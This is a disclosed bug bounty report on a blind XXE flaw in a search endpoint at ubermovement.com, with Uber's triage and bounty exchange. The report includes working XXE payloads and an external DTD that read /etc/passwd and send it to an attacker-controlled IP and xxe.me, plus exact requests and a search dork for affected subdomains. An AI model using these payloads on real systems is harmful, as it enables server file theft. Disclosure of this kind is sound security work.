title: Blind OOB XXE At "http://ubermovement.com/"
vulnerability_information:
Test Summary :
-
POST data was set to <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch> 

An HTTP request was initiated for the domain http://122.180.248.81/ which indicates that this script is vulnerable to XXE injection.

NOTE : As it was Blind XXE Test I was Successful in Ping Test for XXE. But unable to retrieve any sensitive information.   

HTTP request details: 
----------------------------
IP address: 8.36.86.67
User agent: Java/1.8.0_60

Vulnerable Domain :
-
http://ubermovement.com/

Vulnerable Link :
-
http://ubermovement.com/api/search/GeneralSearch

Vulnerable Parameter :
-
GeneralSearch

Steps To Reproduce :
-
1. Go to website : http://ubermovement.com/
2. Attach burp Suite & start intercepting now, click on search and search...
3. Grab the GET request
Eg. Original HTTP Request :
-
GET /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

4. NOW,

Send request to repeater & change it to POST.

Eg. Original HTTP Request :
-
POST /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

5. Now Add content type :
Eg. Content-type: application/xml

Request will be:
-
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

6. Deploy web server and host "payload.dtd" File eg :
payload.dtd :
-
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>">
%all;


7. Now Add XXE Payload For confirmation :
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [ 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload23.dtd">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>

Request Will Be :
-
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 214
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [ 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>

NOTE : If you view your web server logs you will find a 404 error.
vulnerability_information_html:
Test Summary :

POST data was set to <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/%22%3E ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch>

An HTTP request was initiated for the domain http://122.180.248.81/ which indicates that this script is vulnerable to XXE injection.

NOTE : As it was Blind XXE Test I was Successful in Ping Test for XXE. But unable to retrieve any sensitive information.

HTTP request details:

IP address: 8.36.86.67
User agent: Java/1.8.0_60

Vulnerable Domain :

http://ubermovement.com/

Vulnerable Link :

http://ubermovement.com/api/search/GeneralSearch

Vulnerable Parameter :

GeneralSearch

Steps To Reproduce :

  1. Go to website : http://ubermovement.com/
  2. Attach burp Suite & start intercepting now, click on search and search...

  3. Grab the GET request

    Eg. Original HTTP Request :

    GET /api/search/GeneralSearch HTTP/1.1
    Host: ubermovement.com
    Accept: /
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close

  4. NOW,

Send request to repeater & change it to POST.

Eg. Original HTTP Request :

POST /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /

  1. Now Add content type : Eg. Content-type: application/xml

Request will be:

POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /

  1. Deploy web server and host "payload.dtd" File eg :

    payload.dtd :

    <?xml version="1.0" encoding="UTF-8"?>
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file%3B'%3E%22%3E
    %all;

  2. Now Add XXE Payload For confirmation :
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE roottag [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://122.180.248.81/payload23.dtd%22%3E
    %dtd;]>
    <GeneralSearch>&send;</GeneralSearch>

Request Will Be :

POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 214
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd%22%3E
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>

NOTE : If you view your web server logs you will find a 404 error.

activities.message:
Hi @raghav_bisht,

Thank you for your report. Please have patience as we triage this internally.

Thanks!

activities.message:
Hi @raghav_bisht,

We've discovered that this potential issue is within Squarespace code and have raised the report with them.

Thanks!

activities.message:
Great...:)
And 
NOTE : Also Patch the subdomains for ubermovement.com [.*ubermovement.com] As they are also using the same "/api/search/GeneralSearch" File.
Google Dork : site:ubermovement.com "/search/"

Thanks,

activities.message: I am closing this report as `Resolved`. We have meetings every few weeks to discuss `Resolved` reports and we will follow up after the next one to determine if this submission was eligible under our bug bounty program. Thank you!
activities.markdown_message: I am closing this report as Resolved. We have meetings every few weeks to discuss Resolved reports and we will follow up after the next one to determine if this submission was eligible under our bug bounty program. Thank you!

activities.message: Thanks for the report, @raghav_bisht! Since this vulnerability was caused by an issue in SquareSpace’s platform and not ours, it doesn't affect Uber's infrastructure and thus has a lower impact. However, we thank you for the report and are rewarding you with a $500 bounty for the find. We encourage you to continue participating in Uber’s bug bounty program in the future!
activities.markdown_message: Thanks for the report, @raghav_bisht! Since this vulnerability was caused by an issue in SquareSpace’s platform and not ours, it doesn't affect Uber's infrastructure and thus has a lower impact. However, we thank you for the report and are rewarding you with a $500 bounty for the find. We encourage you to continue participating in Uber’s bug bounty program in the future!

activities.message:
@uber  
First thanks for Bounty...
Second 500$ for vulnerability like xxe is not satisfactorily...
Friendly advice take down your domains like ubermovement.com which include maximum third party cms and other Technologies so other bug hunters don't waste their time...like I did for this bug and get nothing in end....:( :(
Personal rating for uber bug bounty......0 out of 10

activities.message:
@uber I believe this is not fair reward for this vulnerability, as XXE counts as critical and it is fairly easy to execute also about all subdomain were showing the same vulnerability in .*ubermovement.com 

Secondary I found this vulnerability in ubermovement.com that is in your bounty program scope. 
It was not like this the squarespace guys has written code and you are hosting the code . the vulnerability will effect squarespace. The vulnerability was affecting your website and servers....

This report is not over yet I would like I will be waiting for your reply..

activities.message:
Hi @raghav_bisht, I'm sorry you are not satisfied with the award for this report. As stated in our [program policy](https://hackerone.com/uber) our awards are impact-based:

> Our rewards are impact-based. This means, for example, that we will issue a relatively high reward for a vulnerability that has the potential to leak sensitive user data, but that we will issue little to no reward for a vulnerability that allows an attacker to deface a microsite. 

As @aegarbutt indicated this vulnerability was caused by an issue in a third party vendor's product and did not affect internal uber infrastructure. As this report has been publicly disclosed on Twitter we have made the original report public as well. In the future we'd prefer if you follow the procedures outlined in the "What about public disclosure?" section of our [program policy](https://hackerone.com/uber):

> Found a particularly interesting or clever bug in an Uber service? We’re more than happy to publicly disclose your bug once it has been remediated by our developers. Please note that in certain situations we may request more time to investigate an issue internally to ensure that it is properly fixed across all Uber services. Public disclosure before Uber has had time to remediate an issue is grounds for immediate forfeiture of any reward as well as possible removal from the bug bounty program.

Thanks, and best of luck with your future hunting!

Our rewards are impact-based. This means, for example, that we will issue a relatively high reward for a vulnerability that has the potential to leak sensitive user data, but that we will issue little to no reward for a vulnerability that allows an attacker to deface a microsite.

As @aegarbutt indicated this vulnerability was caused by an issue in a third party vendor's product and did not affect internal uber infrastructure. As this report has been publicly disclosed on Twitter we have made the original report public as well. In the future we'd prefer if you follow the procedures outlined in the "What about public disclosure?" section of our program policy:

Found a particularly interesting or clever bug in an Uber service? We’re more than happy to publicly disclose your bug once it has been remediated by our developers. Please note that in certain situations we may request more time to investigate an issue internally to ensure that it is properly fixed across all Uber services. Public disclosure before Uber has had time to remediate an issue is grounds for immediate forfeiture of any reward as well as possible removal from the bug bounty program.

Thanks, and best of luck with your future hunting!

summaries.content: The researcher located a XXE vulnerability caused by an issue in a third party vendor's product. As it didn't affect Uber's internal infrastructure it had a significantly lower impact and was rewarded accordingly.
summaries.content_html: The researcher located a XXE vulnerability caused by an issue in a third party vendor's product. As it didn't affect Uber's internal infrastructure it had a significantly lower impact and was rewarded accordingly.
